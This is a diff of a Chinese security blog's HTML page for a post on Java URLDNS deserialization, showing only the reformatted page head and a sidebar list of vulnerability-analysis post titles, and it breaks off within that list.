@@ -1,386 +1,1045 @@
-<!doctype html><html lang=zh-cn class="js csstransforms3d"><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.122.0"><meta name=description content="记录一些学习和生活日常"><meta name=author content="darkmoon"><link rel=icon href=/images/favicon.png type=image/png><title>JAVA URL DNS 研究 - chestnut's blog</title>
-<link href=/css/nucleus.css?1706695144 rel=stylesheet><link href=/css/fontawesome-all.min.css?1706695144 rel=stylesheet><link href=/css/hybrid.css?1706695144 rel=stylesheet><link href=/css/featherlight.min.css?1706695144 rel=stylesheet><link href=/css/perfect-scrollbar.min.css?1706695144 rel=stylesheet><link href=/css/auto-complete.css?1706695144 rel=stylesheet><link href=/css/atom-one-dark-reasonable.css?1706695144 rel=stylesheet><link href=/css/theme.css?1706695144 rel=stylesheet><link href=/css/tabs.css?1706695144 rel=stylesheet><link href=/css/hugo-theme.css?1706695144 rel=stylesheet><link href=/css/theme-blue.css?1706695144 rel=stylesheet><script src=/js/dayjs.min.js?1706695144></script><script src=/js/jquery-3.3.1.min.js?1706695144></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-F5TRJPEVXY"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-F5TRJPEVXY")</script><style>:root #header+#content>#left>#rlblock_left{display:none!important}</style></head><body data-url=/zh-cn/research/web/java-deserialization/urldns/><nav id=sidebar class=showVisitedLinks><div id=header-wrapper><div id=header><a id=logo href=/zh-cn><svg id="grav-logo" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%" viewBox="0 0 285.1 69.9"><g><path d="M35 0c9.6.0 17.9 3.4 24.7 10.3C66.5 17.1 70 25.3 70 35s-3.4 17.9-10.3 24.7C52.9 66.5 44.7 70 35 70c-9.7.0-17.9-3.4-24.7-10.3C3.4 52.8.0 44.6.0 34.9.0 25.3 3.4 17 10.3 10.2 17.1 3.4 25.3.0 35 0zM22.3 63.7c.3-7.4.3-14.7.0-22.1-2.1-.4-4-.4-5.9.0-.2.8-.2 2.5-.1 4.9.1 2.3.0 3.9-.3 4.8-1.7-.6-2.7-2.1-3.1-4.6-.1-.7-.1-3.3-.1-8 0-14.5-.1-23-.3-25.6-3.6 4.1-5.6 7-5.9 8.5v10.9c0 4.5.1 8.1.2 10.9.0.4.0 1.3-.1 2.8-.1 1.2.0 2.1.1 2.6.1.6 1.1 2.1 2.8 4.7C13.2 58.7 17.5 62.2 22.3 63.7zm22.3 1.7c.3-5 .2-12.9-.1-23.6-2.1-.3-4.1-.3-5.9.0-.2 2-.2 5.1-.1 9.5.1 4.3.0 7.5-.1 9.5-2.9.4-5 .3-6.2-.1-.2-5.6-.2-15.2-.1-28.7.1-12.4.0-21.8-.3-28.3-2.4.1-4.3.6-5.7 1.3-.1 7.7-.2 17.7-.1 30.1.0 16.5.0 26.6.0 30.3 2.3 1.1 5.4 1.7 9.4 1.7C38.9 66.9 42.1 66.4 44.6 65.4zM48.1 64.1c9.7-4.6 15.7-12 18-22.2-1.8-.2-3.8-.3-6.1-.3-1.6 3.9-2.6 6.3-3.2 7.2-1.1 1.7-2 2.5-2.7 2.5C54 46 54 39.1 54 30.5c0-11.5.0-18.4.0-20.9-1.4-1.4-3.3-2.5-5.7-3.4C48.1 6.3 48 6.4 48 6.7c0 3.5.0 13.1.0 28.8C47.9 47.2 48 56.8 48.1 64.1z"/></g><g><path d="M116.6 51.3h-29c-.5.0-.9-.1-1.3-.2-.4-.2-.7-.4-1-.7-.3-.3-.5-.6-.7-1s-.2-.8-.2-1.3V16.3h6.3V45h25.8v6.3z"/><path d="M154.8 51.3h-22.9c-.9.0-1.8-.2-2.9-.5-1-.3-2-.8-2.9-1.5s-1.6-1.6-2.2-2.8c-.6-1.1-.9-2.5-.9-4.2V19.5c0-.4.1-.9.2-1.2.2-.4.4-.7.7-1s.6-.5 1-.7.8-.2 1.3-.2h28.6v6.3h-25.4v19.8c0 .8.2 1.5.7 1.9s1.1.7 1.9.7h22.9v6.2zM151.9 37h-20v-6.4h20V37z"/><path d="M197.3 51.3H191v-8.6h-22.3v8.6h-6.3V33.8c0-2.6.4-4.9 1.3-7.1s2.1-4 3.7-5.5 3.4-2.8 5.5-3.6c2.1-.9 4.5-1.3 7-1.3h14.3c.4.0.9.1 1.2.2.4.2.7.4 1 .7s.5.6.7 1 .2.8.2 1.2V51.3zM168.7 36.4H191V22.6h-11.2c-.2.0-.6.0-1.2.1s-1.4.2-2.2.4c-.8.2-1.7.6-2.6 1-.9.5-1.8 1.1-2.5 2-.8.8-1.4 1.9-1.9 3.1-.5 1.2-.7 2.8-.7 4.5v2.7z"/><path d="M241.7 28.1c0 1.4-.2 2.7-.5 3.9-.4 1.1-.8 2.1-1.5 3-.6.9-1.3 1.6-2.1 2.2-.8.6-1.6 1.1-2.5 1.5s-1.8.7-2.6.9c-.9.2-1.7.3-2.5.3l13.3 11.5h-9.8l-13.2-11.5h-4.6v-6.3H230c.8-.1 1.5-.2 2.2-.5s1.2-.6 1.7-1.1.9-1 1.1-1.6c.3-.6.4-1.4.4-2.2v-4c0-.4.0-.6-.1-.8s-.2-.3-.3-.4c-.1-.1-.3-.1-.4-.2-.2.0-.3.0-.4.0h-20.9v28.7H207v-32c0-.4.1-.9.2-1.2.2-.4.4-.7.7-1 .3-.3.6-.5 1-.7s.8-.2 1.3-.2H234c1.4.0 2.6.3 3.6.8s1.8 1.2 2.4 1.9c.6.8 1 1.6 1.3 2.5s.4 1.7.4 2.5v4z"/><path d="M285.1 48.6c0 .5-.1.9-.3 1.3s-.4.7-.7 1-.6.5-1 .7-.8.2-1.2.2-.8-.1-1.2-.2-.8-.4-1.1-.7l-23.2-24.2v24.7h-6.3V19c0-.7.2-1.2.5-1.8.4-.5.8-.9 1.4-1.2.6-.2 1.2-.3 1.9-.2s1.2.4 1.6.9l23.2 24.2V16.3h6.3V48.6z"/></g></svg></a></div><div class=searchbox><label for=search-by><i class="fas fa-search"></i></label>
+<!doctype html><html lang=zh-cn class="js csstransforms3d">
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=generator content="Hugo 0.89.4">
+<meta name=description content="记录一些学习和生活日常">
+<meta name=author content="darkmoon">
+<link rel=icon href=/images/favicon.png type=image/png>
+<title>JAVA URL DNS 研究 - chestnut's blog</title>
+<link href=/css/nucleus.css?1706695571 rel=stylesheet>
+<link href=/css/fontawesome-all.min.css?1706695571 rel=stylesheet>
+<link href=/css/hybrid.css?1706695571 rel=stylesheet>
+<link href=/css/featherlight.min.css?1706695571 rel=stylesheet>
+<link href=/css/perfect-scrollbar.min.css?1706695571 rel=stylesheet>
+<link href=/css/auto-complete.css?1706695571 rel=stylesheet>
+<link href=/css/atom-one-dark-reasonable.css?1706695571 rel=stylesheet>
+<link href=/css/theme.css?1706695571 rel=stylesheet>
+<link href=/css/tabs.css?1706695571 rel=stylesheet>
+<link href=/css/hugo-theme.css?1706695571 rel=stylesheet>
+<link href=/css/theme-blue.css?1706695571 rel=stylesheet>
+<script src=/js/dayjs.min.js?1706695571></script>
+<script src=/js/jquery-3.3.1.min.js?1706695571></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-F5TRJPEVXY"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-F5TRJPEVXY')</script>
+<style>:root #header+#content>#left>#rlblock_left{display:none!important}</style>
+</head>
+<body data-url=/zh-cn/research/web/java-deserialization/urldns/>
+<nav id=sidebar class=showVisitedLinks>
+<div id=header-wrapper>
+<div id=header>
+<a id=logo href=/zh-cn><svg id="grav-logo" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%" viewBox="0 0 285.1 69.9"><g><path d="M35 0c9.6.0 17.9 3.4 24.7 10.3C66.5 17.1 70 25.3 70 35s-3.4 17.9-10.3 24.7C52.9 66.5 44.7 70 35 70c-9.7.0-17.9-3.4-24.7-10.3C3.4 52.8.0 44.6.0 34.9.0 25.3 3.4 17 10.3 10.2 17.1 3.4 25.3.0 35 0zM22.3 63.7c.3-7.4.3-14.7.0-22.1-2.1-.4-4-.4-5.9.0-.2.8-.2 2.5-.1 4.9.1 2.3.0 3.9-.3 4.8-1.7-.6-2.7-2.1-3.1-4.6-.1-.7-.1-3.3-.1-8 0-14.5-.1-23-.3-25.6-3.6 4.1-5.6 7-5.9 8.5v10.9c0 4.5.1 8.1.2 10.9.0.4.0 1.3-.1 2.8-.1 1.2.0 2.1.1 2.6.1.6 1.1 2.1 2.8 4.7C13.2 58.7 17.5 62.2 22.3 63.7zm22.3 1.7c.3-5 .2-12.9-.1-23.6-2.1-.3-4.1-.3-5.9.0-.2 2-.2 5.1-.1 9.5.1 4.3.0 7.5-.1 9.5-2.9.4-5 .3-6.2-.1-.2-5.6-.2-15.2-.1-28.7.1-12.4.0-21.8-.3-28.3-2.4.1-4.3.6-5.7 1.3-.1 7.7-.2 17.7-.1 30.1.0 16.5.0 26.6.0 30.3 2.3 1.1 5.4 1.7 9.4 1.7C38.9 66.9 42.1 66.4 44.6 65.4zM48.1 64.1c9.7-4.6 15.7-12 18-22.2-1.8-.2-3.8-.3-6.1-.3-1.6 3.9-2.6 6.3-3.2 7.2-1.1 1.7-2 2.5-2.7 2.5C54 46 54 39.1 54 30.5c0-11.5.0-18.4.0-20.9-1.4-1.4-3.3-2.5-5.7-3.4C48.1 6.3 48 6.4 48 6.7c0 3.5.0 13.1.0 28.8C47.9 47.2 48 56.8 48.1 64.1z"/></g><g><path d="M116.6 51.3h-29c-.5.0-.9-.1-1.3-.2-.4-.2-.7-.4-1-.7-.3-.3-.5-.6-.7-1s-.2-.8-.2-1.3V16.3h6.3V45h25.8v6.3z"/><path d="M154.8 51.3h-22.9c-.9.0-1.8-.2-2.9-.5-1-.3-2-.8-2.9-1.5s-1.6-1.6-2.2-2.8c-.6-1.1-.9-2.5-.9-4.2V19.5c0-.4.1-.9.2-1.2.2-.4.4-.7.7-1s.6-.5 1-.7.8-.2 1.3-.2h28.6v6.3h-25.4v19.8c0 .8.2 1.5.7 1.9s1.1.7 1.9.7h22.9v6.2zM151.9 37h-20v-6.4h20V37z"/><path d="M197.3 51.3H191v-8.6h-22.3v8.6h-6.3V33.8c0-2.6.4-4.9 1.3-7.1s2.1-4 3.7-5.5 3.4-2.8 5.5-3.6c2.1-.9 4.5-1.3 7-1.3h14.3c.4.0.9.1 1.2.2.4.2.7.4 1 .7s.5.6.7 1 .2.8.2 1.2V51.3zM168.7 36.4H191V22.6h-11.2c-.2.0-.6.0-1.2.1s-1.4.2-2.2.4c-.8.2-1.7.6-2.6 1-.9.5-1.8 1.1-2.5 2-.8.8-1.4 1.9-1.9 3.1-.5 1.2-.7 2.8-.7 4.5v2.7z"/><path d="M241.7 28.1c0 1.4-.2 2.7-.5 3.9-.4 1.1-.8 2.1-1.5 3-.6.9-1.3 1.6-2.1 2.2-.8.6-1.6 1.1-2.5 1.5s-1.8.7-2.6.9c-.9.2-1.7.3-2.5.3l13.3 11.5h-9.8l-13.2-11.5h-4.6v-6.3H230c.8-.1 1.5-.2 2.2-.5s1.2-.6 1.7-1.1.9-1 1.1-1.6c.3-.6.4-1.4.4-2.2v-4c0-.4.0-.6-.1-.8s-.2-.3-.3-.4c-.1-.1-.3-.1-.4-.2-.2.0-.3.0-.4.0h-20.9v28.7H207v-32c0-.4.1-.9.2-1.2.2-.4.4-.7.7-1 .3-.3.6-.5 1-.7s.8-.2 1.3-.2H234c1.4.0 2.6.3 3.6.8s1.8 1.2 2.4 1.9c.6.8 1 1.6 1.3 2.5s.4 1.7.4 2.5v4z"/><path d="M285.1 48.6c0 .5-.1.9-.3 1.3s-.4.7-.7 1-.6.5-1 .7-.8.2-1.2.2-.8-.1-1.2-.2-.8-.4-1.1-.7l-23.2-24.2v24.7h-6.3V19c0-.7.2-1.2.5-1.8.4-.5.8-.9 1.4-1.2.6-.2 1.2-.3 1.9-.2s1.2.4 1.6.9l23.2 24.2V16.3h6.3V48.6z"/></g></svg>
+</a>
+</div>
+<div class=searchbox>
+<label for=search-by><i class="fas fa-search"></i></label>
 <input data-search-input id=search-by type=search placeholder=搜索...>
-<span data-search-clear><i class="fas fa-times"></i></span></div><script type=text/javascript src=/js/lunr.min.js?1706695144></script><script type=text/javascript src=/js/auto-complete.js?1706695144></script><script type=text/javascript>var baseurl="https://www.ch35tnut.site/zh-cn"</script><script type=text/javascript src=/js/search.js?1706695144></script></div><section id=homelinks><ul><li><a class=padding href=/zh-cn><i class='fas fa-home'></i> 首页</a></li></ul></section><div class=highlightable><ul class=topics><li data-nav-id=/zh-cn/research/ title=安全研究 class="dd-item
-parent"><a href=/zh-cn/research/><b>X. </b>安全研究
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/iot/ title=Iot class=dd-item><a href=/zh-cn/research/iot/><b>X. </b>Iot
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/linux/ title=Linux class=dd-item><a href=/zh-cn/research/linux/><b>X. </b>Linux
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/linux/malware/ title=Malware class=dd-item><a href=/zh-cn/research/linux/malware/><b>X. </b>Malware
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/linux/suid/ title=Suid class=dd-item><a href=/zh-cn/research/linux/suid/>Suid
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/windows/ title=Windows class=dd-item><a href=/zh-cn/research/windows/><b>X. </b>Windows
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/windows/dll-inject/ title=Dll注入 class=dd-item><a href=/zh-cn/research/windows/dll-inject/><b>X. </b>Dll注入
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/windows/pe/ title=Pe class=dd-item><a href=/zh-cn/research/windows/pe/><b>X. </b>Pe
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/protocol/ title=协议 class=dd-item><a href=/zh-cn/research/protocol/><b>X. </b>协议
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/protocol/ntlm/ title="NTLM 协议" class=dd-item><a href=/zh-cn/research/protocol/ntlm/><b>X. </b>NTLM 协议
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/protocol/kerberos/ title="Kerberos 协议" class=dd-item><a href=/zh-cn/research/protocol/kerberos/><b>X. </b>Kerberos 协议
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/protocol/kerberos/kerberos-in-windows/ title=Windows中的kerberos协议 class=dd-item><a href=/zh-cn/research/protocol/kerberos/kerberos-in-windows/><b>X. </b>Windows中的kerberos协议
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/ title=认证原理 class=dd-item><a href=/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/>认证原理
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/protocol/netlogon/ title=Netlogon class=dd-item><a href=/zh-cn/research/protocol/netlogon/>Netlogon
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/web/ title=Web class="dd-item
-parent"><a href=/zh-cn/research/web/><b>X. </b>Web
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/web/java-deserialization/ title="Java Deserialization" class="dd-item
-parent"><a href=/zh-cn/research/web/java-deserialization/><b>X. </b>Java Deserialization
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/ title="CommonsBeanutils1 Chain" class=dd-item><a href=/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/>CommonsBeanutils1 Chain
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/web/java-deserialization/urldns/ title="JAVA URL DNS 研究" class="dd-item active"><a href=/zh-cn/research/web/java-deserialization/urldns/>JAVA URL DNS 研究
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/web/php-filter-rce/ title="PHP Filter RCE 分析" class=dd-item><a href=/zh-cn/research/web/php-filter-rce/>PHP Filter RCE 分析
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/code-audit/ title=代码审计 class=dd-item><a href=/zh-cn/research/code-audit/><b>X. </b>代码审计
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/code-audit/codeql/ title=Codeql class=dd-item><a href=/zh-cn/research/code-audit/codeql/><b>X. </b>Codeql
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/code-audit/wireshark-185/ title="Wireshark 1.8.5代码审计" class=dd-item><a href=/zh-cn/research/code-audit/wireshark-185/>Wireshark 1.8.5代码审计
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/code-audit/news-server/ title="News Server审计" class=dd-item><a href=/zh-cn/research/code-audit/news-server/>News Server审计
-<i class="fas fa-check read-icon"></i></a></li></ul></li></ul></li><li data-nav-id=/zh-cn/vulnerability/ title=漏洞分析 class=dd-item><a href=/zh-cn/vulnerability/><b>X. </b>漏洞分析
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/vulnerability/windows-clfs-eop/ title="Windows CLFS EoP" class=dd-item><a href=/zh-cn/vulnerability/windows-clfs-eop/><b>X. </b>Windows CLFS EoP
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/ title=CVE-2023-28252 class=dd-item><a href=/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/>CVE-2023-28252
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/ title=CVE-2022-37969 class=dd-item><a href=/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/>CVE-2022-37969
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-7028-gitlab-account-takeover/ title="CVE-2023-7028 GitLab Account Takeover" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-7028-gitlab-account-takeover/>CVE-2023-7028 GitLab Account Takeover
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/ title="CVE-2016-4437 Shiro 550 RCE 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/>CVE-2016-4437 Shiro 550 RCE 分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/ title="CVE 2023 6553 Wordpress Backup Migration Plugin RCE" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/>CVE 2023 6553 Wordpress Backup Migration Plugin RCE
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/ title="CVE-2023-50164 Apache Struts RCE分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/>CVE-2023-50164 Apache Struts RCE分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-21746-windows-ntlm-privilege-escalation/ title="CVE-2023-21746 Windows NTLM Privilege Escalation" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-21746-windows-ntlm-privilege-escalation/>CVE-2023-21746 Windows NTLM Privilege Escalation
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/ title="CVE-2020-17530 Apache Struts OGNL RCE分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/>CVE-2020-17530 Apache Struts OGNL RCE分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2021-4034-polkit-eop/ title="CVE-2021-4034 Polkit 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2021-4034-polkit-eop/>CVE-2021-4034 Polkit 权限提升漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/ title="CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/>CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2022-23121-afp-rce/ title="CVE-2022-23121 AFP RCE 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2022-23121-afp-rce/>CVE-2022-23121 AFP RCE 分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/ title="CVE-2023-36563 Wordpad Info Disclosure 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/>CVE-2023-36563 Wordpad Info Disclosure 分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/squid-dos/ title="Squid 拒绝服务漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/squid-dos/>Squid 拒绝服务漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/ title="CVE-2023-4966 Citrix Gateway 信息泄露漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/>CVE-2023-4966 Citrix Gateway 信息泄露漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/ title="CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/>CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/ title="CVE-2023-38545 Curl 堆溢出漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/>CVE-2023-38545 Curl 堆溢出漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/ title="CVE-2023-4863 Libwebp Rce 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/>CVE-2023-4863 Libwebp Rce 分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/ title="CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/>CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/ title="瑞友天翼 Rce分析" class=dd-item><a href=/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/>瑞友天翼 Rce分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/ title="CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/>CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/ title="CVE-2023-38148 Windows Ics Rce分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/>CVE-2023-38148 Windows Ics Rce分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/ title="CVE-2023-3519 Cirtix Gateway RCE分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/>CVE-2023-3519 Cirtix Gateway RCE分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/ title="CVE-2023-32315 Openfire 身份认证绕过漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/>CVE-2023-32315 Openfire 身份认证绕过漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/smartbi-rce/ title="Smartbi RCE 分析" class=dd-item><a href=/zh-cn/vulnerability/smartbi-rce/>Smartbi RCE 分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/ title="CVE-2023-2825 Gitlab 路径穿越漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/>CVE-2023-2825 Gitlab 路径穿越漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/zero-logon/ title="Zero Logon 分析" class=dd-item><a href=/zh-cn/vulnerability/zero-logon/>Zero Logon 分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/ title="CVE-2022-4223 PgAdmin RCE 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/>CVE-2022-4223 PgAdmin RCE 分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/strapi-rce/ title="Strapi RCE 漏洞链分析" class=dd-item><a href=/zh-cn/vulnerability/strapi-rce/>Strapi RCE 漏洞链分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/ title="CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/>CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2021-3156-sudo-eop/ title="CVE-2021-3156 Sudo 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2021-3156-sudo-eop/>CVE-2021-3156 Sudo 权限提升漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/ title="CVE-2023-28432 MinIO 信息泄露漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/>CVE-2023-28432 MinIO 信息泄露漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-23397-outlook-eop/ title="CVE-2023-23397 Outlook 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-23397-outlook-eop/>CVE-2023-23397 Outlook 权限提升漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/proxy-not-shell/ title="Proxy Not Shell 利用链分析" class=dd-item><a href=/zh-cn/vulnerability/proxy-not-shell/>Proxy Not Shell 利用链分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2021-40449-win32k-eop/ title="CVE-2021-40449 Win32k 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2021-40449-win32k-eop/>CVE-2021-40449 Win32k 权限提升漏洞分析
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/dailylife/ title=生活随笔 class=dd-item><a href=/zh-cn/dailylife/><b>X. </b>生活随笔
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/dailylife/movies/ title=Movies class=dd-item><a href=/zh-cn/dailylife/movies/><b>X. </b>Movies
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/dailylife/movies/2024-%E6%BD%9C%E8%A1%8C/ title="2024 潜行" class=dd-item><a href=/zh-cn/dailylife/movies/2024-%E6%BD%9C%E8%A1%8C/>2024 潜行
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/dailylife/%E5%90%90%E6%A7%BD/ title=吐槽 class=dd-item><a href=/zh-cn/dailylife/%E5%90%90%E6%A7%BD/>吐槽
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/dailylife/2023-review-and-2024-outlook/ title=2023年总结和2024年展望 class=dd-item><a href=/zh-cn/dailylife/2023-review-and-2024-outlook/>2023年总结和2024年展望
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/ title=杂项 class=dd-item><a href=/zh-cn/misc/><b>X. </b>杂项
